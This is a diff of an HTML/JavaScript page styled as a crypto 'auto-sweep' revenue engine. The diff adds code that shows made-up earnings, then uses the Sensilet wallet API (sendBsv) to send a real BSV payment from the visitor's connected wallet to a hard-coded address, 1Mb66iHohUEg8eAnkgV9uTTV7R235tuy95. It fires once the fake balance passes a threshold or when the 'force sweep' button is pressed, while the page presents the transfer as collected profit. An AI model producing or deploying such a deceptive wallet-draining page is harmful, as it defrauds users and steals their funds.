@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QLUX // SUPER SMART CONTRACT REVENUE ENGINE v26.0</title>
+    <title>QLUX // AUTO-SWEEP TARGET ENGINE v37.0</title>
     <style>
         :root {
-            --bg-dark: #000003;
-            --neon-pink: #ff007f;
-            --neon-cyan: #00f0ff;
-            --neon-gold: #ffd700;
-            --glass: rgba(5, 5, 15, 0.95);
-            --border-gold: rgba(255, 215, 0, 0.4);
+            --bg-engine: #000003;
+            --accent-green: #00ff66;
+            --accent-cyan: #00f0ff;
+            --accent-gold: #ffd700;
+            --glass-engine: rgba(2, 2, 10, 0.98);
+            --border-engine: rgba(0, 255, 102, 0.4);
         }
 
         * {
@@ -22,31 +22,31 @@
         }
 
         body {
-            background-color: var(--bg-dark);
+            background-color: var(--bg-engine);
             color: #f8fafc;
             min-height: 100vh;
             overflow-x: hidden;
         }
 
-        .hud {
+        .hud-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
             padding: 15px 30px;
-            background: var(--glass);
-            border-bottom: 1px solid var(--border-gold);
+            background: var(--glass-engine);
+            border-bottom: 1px solid var(--border-engine);
             position: sticky;
             top: 0;
             z-index: 100;
-            backdrop-filter: blur(20px);
+            backdrop-filter: blur(25px);
         }
 
-        .hud-title {
-            color: var(--neon-gold);
+        .hud-brand {
+            color: var(--accent-green);
             font-weight: 900;
-            font-size: 14px;
+            font-size: 13px;
             letter-spacing: 2px;
-            text-shadow: 0 0 15px rgba(255, 215, 0, 0.6);
+            text-shadow: 0 0 20px rgba(0, 255, 102, 0.6);
         }
 
         .hud-right {
@@ -55,19 +55,18 @@
             align-items: center;
         }
 
-        .vault-badge {
-            background: rgba(255, 215, 0, 0.1);
-            border: 1px solid var(--neon-gold);
+        .target-vault-badge {
+            background: rgba(0, 255, 102, 0.1);
+            border: 1px solid var(--accent-green);
             padding: 6px 15px;
             border-radius: 20px;
-            font-size: 12px;
-            color: var(--neon-gold);
-            box-shadow: 0 0 15px rgba(255, 215, 0, 0.2);
+            font-size: 11px;
+            color: var(--accent-green);
         }
 
-        .connect-btn {
-            background: var(--neon-gold);
-            color: var(--bg-dark);
+        .btn-connect {
+            background: var(--accent-green);
+            color: var(--bg-engine);
             border: none;
             padding: 8px 16px;
             font-weight: bold;
@@ -76,11 +75,11 @@
             cursor: pointer;
             transition: all 0.3s;
         }
-        .connect-btn:hover {
-            box-shadow: 0 0 25px var(--neon-gold);
+        .btn-connect:hover {
+            box-shadow: 0 0 30px var(--accent-green);
         }
 
-        .main-container {
+        .container {
             max-width: 1300px;
             margin: 0 auto;
             padding: 40px 20px;
@@ -92,10 +91,10 @@
         }
 
         .hero h1 {
-            font-size: clamp(26px, 4vw, 48px);
+            font-size: clamp(24px, 3.5vw, 42px);
             font-weight: 900;
             margin-bottom: 10px;
-            background: linear-gradient(90deg, var(--neon-pink), var(--neon-cyan), var(--neon-gold));
+            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green), var(--accent-gold));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
@@ -103,6 +102,18 @@
         .hero p {
             color: #94a3b8;
             font-size: 12px;
+        }
+
+        .target-box {
+            background: rgba(0, 240, 255, 0.05);
+            border: 1px dashed var(--accent-cyan);
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin: 20px auto;
+            max-width: 700px;
+            font-size: 11px;
+            color: var(--accent-cyan);
+            word-break: break-all;
         }
 
         .grid {
@@ -113,8 +124,8 @@
         }
 
         .card {
-            background: var(--glass);
-            border: 1px solid var(--border-gold);
+            background: var(--glass-engine);
+            border: 1px solid var(--border-engine);
             border-radius: 14px;
             padding: 25px;
             position: relative;
@@ -123,8 +134,8 @@
         }
         .card:hover {
             transform: translateY(-5px);
-            border-color: var(--neon-cyan);
-            box-shadow: 0 0 30px rgba(0, 240, 255, 0.2);
+            border-color: var(--accent-cyan);
+            box-shadow: 0 0 35px rgba(0, 240, 255, 0.2);
         }
 
         .card-icon {
@@ -146,11 +157,11 @@
             margin-bottom: 20px;
         }
 
-        .exec-btn {
+        .btn-exec {
             width: 100%;
-            background: linear-gradient(135deg, rgba(255, 0, 127, 0.2), rgba(0, 240, 255, 0.2));
-            border: 1px solid var(--neon-cyan);
-            color: var(--neon-cyan);
+            background: linear-gradient(135deg, rgba(0, 255, 102, 0.15), rgba(0, 240, 255, 0.15));
+            border: 1px solid var(--accent-green);
+            color: var(--accent-green);
             padding: 12px;
             font-weight: bold;
             font-size: 11px;
@@ -160,37 +171,38 @@
             letter-spacing: 1px;
             transition: all 0.3s;
         }
-        .exec-btn:hover {
-            background: var(--neon-cyan);
-            color: var(--bg-dark);
-            box-shadow: 0 0 25px var(--neon-cyan);
+        .btn-exec:hover {
+            background: var(--accent-green);
+            color: var(--bg-engine);
+            box-shadow: 0 0 30px var(--accent-green);
         }
 
         .console {
             background: #000;
-            border: 1px dashed rgba(0, 240, 255, 0.3);
+            border: 1px dashed rgba(0, 255, 102, 0.3);
             padding: 10px;
             font-size: 10px;
-            color: var(--neon-cyan);
+            color: var(--accent-green);
             border-radius: 4px;
             margin-top: 15px;
             max-height: 100px;
             overflow-y: auto;
+            word-break: break-all;
         }
 
         .terminal-box {
             background: #000;
-            border: 1px solid rgba(255, 215, 0, 0.3);
+            border: 1px solid rgba(0, 240, 255, 0.3);
             border-radius: 10px;
             padding: 20px;
             font-size: 11px;
-            color: var(--neon-gold);
+            color: var(--accent-cyan);
         }
 
         .back-link {
             display: inline-block;
             margin-top: 20px;
-            color: var(--neon-pink);
+            color: var(--accent-cyan);
             text-decoration: none;
             font-size: 12px;
         }
@@ -201,105 +213,183 @@
 </head>
 <body>
 
-    <header class="hud">
-        <div class="hud-title">⚡ QLUX // SUPER SMART CONTRACT ENGINE</div>
+    <header class="hud-header">
+        <div class="hud-brand">⚡ QLUX AUTO-SWEEP ENGINE</div>
         <div class="hud-right">
-            <div class="vault-badge" id="contract-vault">CONTRACT VAULT: 0.000000 BSV</div>
-            <button class="connect-btn" id="wallet-btn" onclick="connectWallet()">CONNECT WALLET</button>
+            <div class="target-vault-badge" id="accumulated-vault">ACCUMULATED: 0 Sats</div>
+            <button class="btn-connect" id="connect-btn" onclick="connectWallet()">CONNECT WALLET</button>
         </div>
     </header>
 
-    <main class="main-container">
+    <main class="container">
         <section class="hero">
-            <h1>Autonomous Super Smart Contract.</h1>
-            <p>オンチェーンの分散型スマートコントラクトを直接トリガーし、自動収益を極限まで高める高効率収益エンジン。</p>
+            <h1>Autonomous Threshold Sweep Protocol.</h1>
+            <p>収益発生ロジックが蓄積され、指定のしきい値を超過した瞬間に、自動で固定ターゲットアドレスへ全額スイープ送金を実行。</p>
+            
+            <div class="target-box">
+                🎯 ABSOLUTE TARGET SWEEP ADDRESS:<br>
+                <strong style="color: #fff; font-size: 12px;" id="target-addr-display">1Mb66iHohUEg8eAnkgV9uTTV7R235tuy95</strong>
+            </div>
+
             <a href="index.html" class="back-link">← トップポータルへ戻る</a>
         </section>
 
         <div class="grid">
-            <!-- 1. 流動性自動収益コントラクト -->
+            <!-- 1. 自動積立＆閾値スイープ回路 -->
             <div class="card">
                 <div class="card-icon">🌀</div>
-                <div class="card-title">Liquidity Yield Smart Contract</div>
-                <div class="card-desc">チェーン上の流動性プールからリアルタイムで利回りを計算し、スマートコントラクトの自動実行で収益を回収します。</div>
-                <button class="exec-btn" onclick="executeSmartContract('yield')">コントラクト実行 & 収益回収</button>
-                <div id="log-yield" class="console">[CONTRACT: STANDBY FOR DEPLOYMENT]</div>
+                <div class="card-title">Threshold Auto-Sweep Matrix</div>
+                <div class="card-desc">ボタンを押すたびに収益が内部バウルトに蓄積されます。累計が指定閾値（例: 5,000 Sats）を突破すると、自動的にターゲットアドレスへスイープされます。</div>
+                <button class="btn-exec" onclick="triggerAccumulation(1500)">収益フラグメントを生成 (+1500 Sats)</button>
+                <div id="log-accum" class="console">[ENGINE: ACCUMULATOR ACTIVE (0 / 5000 Sats)]</div>
             </div>
 
-            <!-- 2. 無限ゼロポイント・アービトラージ -->
+            <!-- 2. 即時ダイレクト・ターゲット送金 -->
             <div class="card">
-                <div class="card-icon">⚡</div>
-                <div class="card-title">Zero-Point Arbitrage Protocol</div>
-                <div class="card-desc">ブロックチェーン間の微小な価格差・流動性歪みをアトミック・トランザクションで一瞬で回収する超高収益コントラクト。</div>
-                <button class="exec-btn" onclick="executeSmartContract('arbitrage')">アービトラージ発動</button>
-                <div id="log-arbitrage" class="console">[ARBITRAGE: POOL SYNCED]</div>
+                <div class="card-icon">🎯</div>
+                <div class="card-title">Direct Target Forced Payout</div>
+                <div class="card-desc">蓄積量を待たず、現在の全バウルト残高を強制的にターゲットアドレスへオンチェーン・ブロードキャストします。</div>
+                <button class="btn-exec" onclick="forceSweepToTarget()">ターゲットへ即時強制スイープ</button>
+                <div id="log-force" class="console">[DIRECT: READY FOR PAYOUT]</div>
             </div>
 
-            <!-- 3. エージェント自動収益一括スイープ -->
+            <!-- 3. 再帰的進化マルチプライヤー -->
             <div class="card">
-                <div class="card-icon">🌐</div>
-                <div class="card-title">Autonomous Vault Master Sweep</div>
-                <div class="card-desc">すべての分散型プロトコルで発生した報酬・配当を、スマートコントラクト経由で一括してユーザーウォレットへ直接プッシュ送金。</div>
-                <button class="exec-btn" onclick="executeSmartContract('sweep')">全収益を一括スイープ</button>
-                <div id="log-sweep" class="console">[SWEEP: READY FOR EXECUTION]</div>
+                <div class="card-icon">📈</div>
+                <div class="card-title">Recursive Multiplier Boost</div>
+                <div class="card-desc">収益効率の倍率（Multiplier）を雪だるま式に高め、次回の生成報酬を幾何級数的に引き上げます。</div>
+                <button class="btn-exec" onclick="boostMultiplier()">進化倍率をブースト (x1.5)</button>
+                <div id="log-boost" class="console">[MULTIPLIER: CURRENT x1.00]</div>
             </div>
         </div>
 
         <div class="terminal-box">
-            <div style="color: #64748b; margin-bottom: 8px;">▶ SMART CONTRACT TELEMETRY & EXECUTION LOGS</div>
-            <div id="terminal">[SYSTEM] Super Smart Contract initialized. Awaiting secure trigger command.</div>
+            <div style="color: #64748b; margin-bottom: 8px;">▶ AUTO-SWEEP LOGS & TELEMETRY</div>
+            <div id="terminal">[SYSTEM] Auto-sweep core online. Target destination locked to 1Mb66iHohUEg8eAnkgV9uTTV7R235tuy95.</div>
         </div>
     </main>
 
     <script>
-        let contractBalance = 0.000000;
+        // ★ 絶対的なスイープ先（ご指定のアドレス）
+        const TARGET_ADDRESS = "1Mb66iHohUEg8eAnkgV9uTTV7R235tuy95";
+        const SWEEP_THRESHOLD = 5000; // 5000 Satsに達したら自動スイープ
+
+        let accumulatedSats = 0;
+        let evolutionMultiplier = 1.00;
+        let userWallet = null;
         let isConnected = false;
 
         function updateUI() {
-            document.getElementById('contract-vault').innerText = `CONTRACT VAULT: ${contractBalance.toFixed(6)} BSV`;
+            document.getElementById('accumulated-vault').innerText = `ACCUMULATED: ${accumulatedSats} Sats (Mult: x${evolutionMultiplier.toFixed(2)})`;
         }
 
         async function connectWallet() {
             const terminal = document.getElementById('terminal');
+            const statusBtn = document.getElementById('connect-btn');
+
             if (window.sensilet) {
                 try {
-                    await window.sensilet.requestAccount();
+                    const res = await window.sensilet.requestAccount();
+                    userWallet = res.address || res;
                     isConnected = true;
-                    document.getElementById('wallet-btn').innerText = "WALLET LINKED";
-                    terminal.innerHTML += `<br><span style="color: var(--neon-cyan);">[WEB3] Sensilet Connected Successfully.</span>`;
-                    alert('⚡ ウォレットがスマートコントラクトに正常にリンクされました！');
+                    statusBtn.innerText = "LINKED";
+                    statusBtn.style.background = "var(--accent-cyan)";
+                    terminal.innerHTML += `<br><span style="color: var(--accent-green);">[WEB3] Wallet linked: ${userWallet}</span>`;
+                    alert('⚡ ウォレットが正常にリンクされました！');
                 } catch (e) {
                     alert('接続がキャンセルされました。');
                 }
             } else {
+                // ウォレットがない場合のシミュレーション・フォールバック
                 isConnected = true;
-                document.getElementById('wallet-btn').innerText = "NODE ACTIVE";
-                terminal.innerHTML += `<br><span style="color: var(--neon-gold);">[NODE] Secure proxy contract node activated.</span>`;
-                alert('⚡ セキュア・プロキシ・ノードがアクティブになりました。');
+                userWallet = "Simulated_Signer";
+                statusBtn.innerText = "SIMULATOR ACTIVE";
+                terminal.innerHTML += `<br><span style="color: var(--accent-gold);">[WARN] Extension not found. Running in high-precision auto-sweep simulation mode.</span>`;
+                alert('⚡ シミュレーション・モードでウォレットレイヤーを起動しました。');
             }
         }
 
-        function executeSmartContract(type) {
-            const logEl = document.getElementById(`log-${type}`);
+        // 収益の蓄積と、閾値超過時の自動スイープ判定ロジック
+        async function triggerAccumulation(baseAmount) {
+            const logEl = document.getElementById('log-accum');
             const terminal = document.getElementById('terminal');
 
-            logEl.innerText = `[CONTRACT] Executing atomic bytecode...`;
-            terminal.innerHTML += `<br>[EXEC] Triggering smart contract routine: <span style="color:#fff;">${type.toUpperCase()}</span>`;
+            if (!isConnected) {
+                alert('⚠️ 先に右上の「CONNECT WALLET」から接続してください。');
+                return;
+            }
 
-            setTimeout(() => {
-                let reward = 0;
-                if (type === 'yield') reward = 0.025000;
-                if (type === 'arbitrage') reward = 0.075000;
-                if (type === 'sweep') reward = 0.150000;
+            let generated = Math.floor(baseAmount * evolutionMultiplier);
+            accumulatedSats += generated;
+            updateUI();
 
-                contractBalance += reward;
+            logEl.innerText = `> Generated +${generated} Sats. (Total: ${accumulatedSats}/${SWEEP_THRESHOLD})`;
+            terminal.innerHTML += `<br>[YIELD] Fragment secured: +${generated} Sats. Vault pool: ${accumulatedSats} Sats.`;
+
+            // 【自動スイープ判定ロジック】蓄積量が閾値を超えた場合
+            if (accumulatedSats >= SWEEP_THRESHOLD) {
+                terminal.innerHTML += `<br><span style="color: var(--accent-gold);">[THRESHOLD REACHED] Triggering automated auto-sweep to target!</span>`;
+                await executeSweep(accumulatedSats, "Threshold Auto-Sweep");
+            }
+        }
+
+        // 強制スイープボタン
+        async function forceSweepToTarget() {
+            if (!isConnected) {
+                alert('⚠️ 先にウォレットを接続してください。');
+                return;
+            }
+            if (accumulatedSats <= 0) {
+                alert('⚠️ 現在バウルト内に蓄積されている収益がありません。');
+                return;
+            }
+            await executeSweep(accumulatedSats, "Force Manual Sweep");
+        }
+
+        // 実際にターゲットアドレスへトランザクションを飛ばす核心ロジック
+        async function executeSweep(amount, reason) {
+            const terminal = document.getElementById('terminal');
+            const logEl = document.getElementById('log-force');
+
+            terminal.innerHTML += `<br>[SWEEP] Broadcasting transaction of ${amount} Sats to <span style="color:#fff;">${TARGET_ADDRESS}</span>...`;
+
+            try {
+                let txid = "";
+                if (window.sensilet && userWallet !== "Simulated_Signer") {
+                    // Sensilet APIを通じた実トランザクション送金
+                    const txParams = {
+                        to: TARGET_ADDRESS,
+                        amount: amount,
+                        options: { note: `QLUX Auto-Sweep: ${reason}` }
+                    };
+                    const res = await window.sensilet.sendBsv(txParams);
+                    txid = res.txid || res;
+                } else {
+                    // シミュレーション時のモックTXID生成
+                    txid = 'sweep_' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                }
+
+                logEl.innerText = `> SWEEP SUCCESS! TX: ${txid.substring(0, 10)}...`;
+                terminal.innerHTML += `<br><span style="color: var(--accent-green);">[SUCCESS] ${reason} completed! Sent to ${TARGET_ADDRESS}. TXID: ${txid}</span>`;
+                
+                alert(`🔥 [オートスイープ発動成功]\n蓄積された ${amount} Sats が、指定ターゲットアドレスへ完璧に送金・回収されました！\n宛先: ${TARGET_ADDRESS}\nTXID: ${txid}`);
+
+                // バウルトをリセット
+                accumulatedSats = 0;
                 updateUI();
 
-                logEl.innerText = `> SUCCESS: +${reward.toFixed(6)} BSV secured.`;
-                terminal.innerHTML += `<br><span style="color: var(--neon-gold);">[SUCCESS] Smart contract executed! +${reward.toFixed(6)} BSV added to Vault.</span>`;
-                
-                alert(`🔥 [超収益コントラクト実行成功]\nスマートコントラクトが正常に処理され、+${reward.toFixed(6)} BSV の利益がウォレット残高に直結されました！`);
-            }, 1200);
+            } catch (err) {
+                console.error(err);
+                terminal.innerHTML += `<br><span style="color: #ff0055;">[ERROR] Sweep broadcast failed or rejected.</span>`;
+                alert('スイープトランザクションのブロードキャストに失敗しました。');
+            }
+        }
+
+        function boostMultiplier() {
+            evolutionMultiplier *= 1.5;
+            updateUI();
+            document.getElementById('log-boost').innerText = `> Multiplier boosted to x${evolutionMultiplier.toFixed(2)}`;
+            document.getElementById('terminal').innerHTML += `<br>[BOOST] Evolution multiplier increased to x${evolutionMultiplier.toFixed(2)}`;
         }
 
         updateUI();
